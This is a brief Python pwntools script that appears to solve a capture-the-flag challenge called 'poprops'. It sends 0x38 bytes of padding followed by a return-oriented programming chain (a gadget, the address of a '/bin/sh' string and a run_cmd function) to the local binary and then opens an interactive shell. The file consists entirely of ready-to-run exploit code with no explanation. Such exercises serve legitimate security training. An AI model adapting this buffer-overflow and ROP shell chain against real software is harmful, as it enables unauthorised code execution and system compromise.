#!/usr/bin/env python
from pwn import *

e = ELF("./poprops")

gadget = 0x4005d5
run_cmd = e.symbols["run_cmd"]
binsh = 0x400698
p = process("./poprops")

p.recvuntil("??")

chain = "A" * 0x38 + "".join(map(p64,[
    gadget,
    binsh,
    run_cmd
]))

p.sendline(chain)
p.interactive()
